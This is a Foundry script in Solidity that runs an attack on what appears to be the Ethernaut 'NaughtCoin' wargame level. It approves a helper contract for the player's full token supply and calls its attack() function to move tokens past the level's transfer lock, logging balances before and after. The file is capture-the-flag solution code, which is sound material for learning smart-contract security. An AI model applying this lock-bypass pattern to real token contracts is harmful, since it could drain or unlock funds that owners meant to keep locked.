//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";
import {AttackNaughtCoin} from "../src/AttackNaughtCoin.sol";

contract AttackNaughtCoinScript is Script {
    NaughtCoin public naughtcoin;
    AttackNaughtCoin public attack;
    address public instance = 0xdFbeFd0700E686aa8c2baEac51452356774234C0;

    function run() external {
        vm.startBroadcast();
        naughtcoin = NaughtCoin(instance);
        attack = new AttackNaughtCoin(address(naughtcoin));

        address player = naughtcoin.player();
        uint256 amount = naughtcoin.INITIAL_SUPPLY();

        console.log(
            "Balance of Initial Supply: ",
            naughtcoin.balanceOf(player)
        );
        console.log(
            "Balance of the attacker: ",
            naughtcoin.balanceOf(address(attack))
        );

        naughtcoin.approve(address(attack), amount);

        attack.attack();
        console.log(
            "Balance of Initial supply: ",
            naughtcoin.balanceOf(player)
        );
        console.log(
            "Balance of Attacker: ",
            naughtcoin.balanceOf(address(attack))
        );

        vm.stopBroadcast();
    }
}
